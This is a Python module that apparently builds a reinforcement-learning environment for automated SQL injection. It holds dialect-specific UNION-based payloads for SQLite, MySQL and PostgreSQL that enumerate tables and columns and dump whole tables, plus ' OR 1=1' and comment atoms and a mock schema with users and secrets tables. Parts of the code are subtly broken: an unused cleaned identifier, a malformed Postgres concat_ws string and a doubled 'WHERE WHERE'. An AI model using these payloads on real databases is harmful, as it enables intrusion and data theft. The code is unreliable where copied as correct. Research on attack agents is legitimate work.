from collections import OrderedDict

def quote_ident(dbms, ident):
    clean_ident = ident.strip("\"'`")
    if dbms in ("mysql", "mariadb"):
        return f"`{ident}`"
    else:  # sqlite, postgres
        return f'"{ident}"'
    

def generate_padded_columns(env, payload_str) -> str:
    """Helper function to generate NULLS in the string, based on the identified order by index. 

    Args:
        env: Environement, used to extract class attributes
        payload_str (str): Specific string used for extraction.

    Returns:
        str: String, including dialect specific keyword padded with NULLs
    """    

    target_position = env.information_index

    
    pos = min(target_position, max(1, env.order_index))

    #calculating the padding
    nulls_before = pos -1
    nulls_after = max(0, env.order_index - pos)

    if not nulls_before:
        cols = [payload_str] + ["NULL"] * nulls_after
    else:
        cols = ["NULL"] * nulls_before + [payload_str] + ["NULL"] * nulls_after

    return ", ".join(cols)
    
def concat_column_names(env, column_list):
    """
    Takes a list of column names (e.g. ['id', 'username', 'password'])
    and returns a SQLite string concatenation statement.
    
    Example Output: "id || '::' || username || '::' || password"
    """
    if not column_list:
        return "NULL"
    
    match env.dbms: 
        case "sqlite":
        #Check if the list is empty
            #distuingashable separator.
            _columns = [f"COALESCE({col}, '')" for col in column_list]
            return " || '::' || ".join(_columns)
        
        case "mysql" | "mariadb":
            _columns = [f"IFNULL({quote_ident(env.dbms, col)}, '')" for col in column_list]
            return "CONCAT_WS('::'," + ", ".join(_columns) + ")"
        
        case "postgres":
            _columns = [f"COALESCE({quote_ident(env.dbms, col)}, '')"for col in column_list]
            return "concat_ws('::', )" + ", ".join(_columns) + ")"
     

atomSqliteDict = {
    "STRING_LITERAL": "'",
    "SQL_COMMENT": " -- ",
    "OR_TRUE": " OR 1=1",
    "UNION_SQLITE_MASTER": lambda env: f" UNION SELECT {generate_padded_columns(env, 'name')} FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'",
    "UNION_SQLITE_COLUMN": lambda env: f" UNION SELECT {generate_padded_columns(env, 'sql')} FROM sqlite_master WHERE name = '{env.TABLE_NAME_LIST[env.TABLE_LIST_POINTER] if env.TABLE_NAME_LIST else 'none'}'",
    "UNION_CURRENT_TABLE": lambda env: f" UNION SELECT {generate_padded_columns(env, concat_column_names(env, env.COLUMN_NAMES))} FROM {env.TABLE_NAME_LIST[env.TABLE_LIST_POINTER] if env.TABLE_NAME_LIST else 'none'}",
}

atomMysqlDict = {
    "STRING_LITERAL": "'",
    "SQL_COMMENT": " -- ",
    "OR_TRUE": " OR 1=1",
    "UNION_SQLITE_MASTER": lambda env: f" UNION SELECT {generate_padded_columns(env, 'table_name')} FROM information_schema.tables WHERE table_schema = DATABASE()",
    "UNION_SQLITE_COLUMN": lambda env: f" UNION SELECT {generate_padded_columns(env, 'column_name')} FROM information_schema.columns WHERE table_name = '{env.TABLE_NAME_LIST[env.TABLE_LIST_POINTER] if env.TABLE_NAME_LIST else 'none'}'",
    "UNION_CURRENT_TABLE": lambda env: f" UNION SELECT {generate_padded_columns(env, concat_column_names(env, env.COLUMN_NAMES))} FROM {env.TABLE_NAME_LIST[env.TABLE_LIST_POINTER] if env.TABLE_NAME_LIST else 'none'}",
}

atomPostgresqlDict = {
    "STRING_LITERAL": "'",
    "SQL_COMMENT": " -- ",
    "OR_TRUE": " OR 1=1",
    "UNION_SQLITE_MASTER": lambda env: f" UNION SELECT {generate_padded_columns(env, 'tablename')} FROM pg_catalog.pg_tables WHERE WHERE schemaname NOT IN ('pg_catalog', 'information_schema')",
    "UNION_SQLITE_COLUMN": lambda env: f" UNION SELECT {generate_padded_columns(env, 'column_name')} FROM information_schema.columns WHERE table_name = '{env.TABLE_NAME_LIST[env.TABLE_LIST_POINTER] if env.TABLE_NAME_LIST else 'none'}'",
    "UNION_CURRENT_TABLE": lambda env: f" UNION SELECT {generate_padded_columns(env, concat_column_names(env, env.COLUMN_NAMES))} FROM {env.TABLE_NAME_LIST[env.TABLE_LIST_POINTER] if env.TABLE_NAME_LIST else 'none'}",
}

operationsDict = {
    # Execution and atom removement
    0: "EXECUTE",
    1: "REMOVE_LAST_ATOM",
    #Escape mechanisms
    2: "ADD_STRING_LITERAL",  #insert '
    3: "ADD_SQL_COMMENT",
    # EXPLOIT
    4: "UNION_SQLITE_MASTER",
    5: "UNION_SQLITE_COLUMN",
    6: "UNION_CURRENT_TABLE",
    7: "NEXT_TABLE",
    # ORDER BY probing
    # 8: "ADD_ORDER_BY",
    8: "INCREMENT_ORDER_INDEX",
    9: "DECREMEMT_ORDER_INDEX", 
    # Literals / logic
    10: "ADD_OR_TRUE",       # OR 1=1
}

tablesDict = {
    "users": ["id", "username", "password", "roles"], #y
    "roles": ["id", "description"], #y
    "secrets": ["id", "owner_id", "secret_text", "future_delete_date"], #y
    "products": ["id", "name", "price", "weight", "quantity_def", "quantity_size", "storage_quantity"], #y
    "quantity_def": ["id", "size_text", "definition"], #y
    "transactions": ["id", "amount", "from_customer_id", "intiated_date", "completed_date", "method", "autorized_by"], #y
    "messages": ["id", "sender_id", "receiver_id", "content", "opened"], #y
    "customers": ["id", "first_name", "last_name", "email", "phone", "prefered_size", "fax", 
                  "address_line1", "address_line2", "city", "postal_code", "country", "date_of_birth", 
                  "role", "create_time", "updated_time", "account_balance", "loyalty_discount", "notes"], #y
    "employee_wine_lottery": ["id", "draw_date", "prize_name", "prize_value", "bottle_size_ml", 
                              "vintage_year", "grape_content", "region", "winner_employee_id", "ticket_number", 
                              "claimed", "notes"], #y
    "vignere": ["row_label", "c1", "c2", "c3", "c4", "c5", "c6", "c7", "c8", "c9", "c10", "c11", "c12", "c13",
                "c14", "c15", "c16", "c17", "c18", "c19", "c20", "c21", "c22", "c23", "c24", "c25", "c26"] #y
}

HTTP_STATUS_DICT = {
    # 1XX
    1: {"code": 100, "meaning": "Continue"},
    2: {"code": 101, "meaning": "Switching protocols"},
    3: {"code": 102, "meaning": "Processing (deprecated)"},
    4: {"code": 103, "meaning": "Early hints"},

    # 2XX
    5: {"code": 200, "meaning": "OK"},
    6: {"code": 201, "meaning": "Created"},
    7: {"code": 202, "meaning": "Accepted"},
    8: {"code": 203, "meaning": "Non-authoritative information"},
    9: {"code": 204, "meaning": "No content"},
    10: {"code": 205, "meaning": "Reset content"},
    11: {"code": 206, "meaning": "Partial content"},
    12: {"code": 207, "meaning": "Multi status"},
    13: {"code": 208, "meaning": "Already reported"},
    14: {"code": 226, "meaning": "IM used (HTTP delta encoding)"},

    # 3XX
    15: {"code": 300, "meaning": "Multiple choices"},
    16: {"code": 301, "meaning": "Moved permanently"},
    17: {"code": 302, "meaning": "Found"},
    18: {"code": 303, "meaning": "See other"},
    19: {"code": 304, "meaning": "Not modified"},
    20: {"code": 305, "meaning": "Use proxy (deprecated)"},
    21: {"code": 307, "meaning": "Temporary redirect"},
    22: {"code": 308, "meaning": "Permanent redirect"},

    # 4XX
    23: {"code": 400, "meaning": "Bad request"},
    24: {"code": 401, "meaning": "Unauthorized"},
    25: {"code": 402, "meaning": "Payment required"},
    26: {"code": 403, "meaning": "Forbidden"},
    27: {"code": 404, "meaning": "Not found"},
    28: {"code": 405, "meaning": "Method not allowed"},
    29: {"code": 406, "meaning": "Not acceptable"},
    30: {"code": 407, "meaning": "Proxy authentication required"},
    31: {"code": 408, "meaning": "Request timeout"},
    32: {"code": 409, "meaning": "Conflict"},
    33: {"code": 410, "meaning": "Gone"},
    34: {"code": 411, "meaning": "Length required"},
    35: {"code": 412, "meaning": "Precondition failed"},
    36: {"code": 413, "meaning": "Content too large"},
    37: {"code": 414, "meaning": "URI too long"},
    38: {"code": 415, "meaning": "Unsupported media type"},
    39: {"code": 416, "meaning": "Range not satisfiable"},
    40: {"code": 417, "meaning": "Expectation failed"},
    41: {"code": 421, "meaning": "Misdirected request"},
    42: {"code": 422, "meaning": "Unprocessable content"},
    43: {"code": 423, "meaning": "Locked"},
    44: {"code": 424, "meaning": "Failed dependency"},
    45: {"code": 425, "meaning": "Too early"},
    46: {"code": 426, "meaning": "Upgrade required"},
    47: {"code": 428, "meaning": "Precondition required"},
    48: {"code": 429, "meaning": "Too many requests"},
    49: {"code": 431, "meaning": "Request header fields too large"},
    50: {"code": 451, "meaning": "Unavailable for legal reasons"},

    # 5XX
    51: {"code": 500, "meaning": "Internal server error"},
    52: {"code": 501, "meaning": "Not implemented"},
    53: {"code": 502, "meaning": "Bad gateway"},
    54: {"code": 503, "meaning": "Service unavailable"},
    55: {"code": 504, "meaning": "Gateway timeout"},
    56: {"code": 505, "meaning": "HTTP version not supported"},
    57: {"code": 506, "meaning": "Variant also negotiates"},
    58: {"code": 507, "meaning": "Insufficient storage"},
    59: {"code": 508, "meaning": "Loop detected"},
    60: {"code": 510, "meaning": "Not extended"},
    61: {"code": 511, "meaning": "Network authentication required"},
}


random_query_templates = [
    # string-like context
    {
        "prefix": ["SELECT"," ","*"," ","FROM"," ", "$TABLE"," ","WHERE"," ", "$COLUMN"," ","LIKE","=","'"],
        "suffix": ["'",";"]
    },

    # numeric context
    {
        "prefix": ["SELECT"," ","*"," ","FROM"," ", "$TABLE"," ","WHERE"," ", "$COLUMN"," ","="," "],
        "suffix": [";"]
    },

    # boolean context
    {
        "prefix": ["SELECT"," ","*"," ","FROM"," ", "$TABLE"," ","WHERE"," ", "$COLUMN"," ","="," ","'"],
        "suffix": ["'"," ","AND"," ","1","=","1",";"]
    },

    # ORDER BY context
    {
        "prefix": ["SELECT"," ","*"," ","FROM"," ", "$TABLE"," ","ORDER"," ","BY"," ","$COLUMN"," ","LIMIT"," ","10"," ","--"," "],
        "suffix": [";"]
    },

    # multi-condition WHERE
    {
        "prefix": ["SELECT"," ","*"," ","FROM"," ", "$TABLE"," ","WHERE"," ",
                   "$COLUMN"," ","="," ","'","dummy","'"," ","AND"," ", "$COLUMN"," ","LIKE","=","'"],
        "suffix": ["'",";"]
    },

    # IN (...) context
    {
        "prefix": ["SELECT"," ","*"," ","FROM"," ", "$TABLE"," ","WHERE"," ",
                   "$COLUMN"," ","IN"," ","(","'"],
        "suffix": ["'",")",";"]
    }
]

def remove_duplicates_preserve_order(seq:list):
    return list(OrderedDict.fromkeys(seq))


if __name__ == "__main__":
    

    print ("Stage 1")

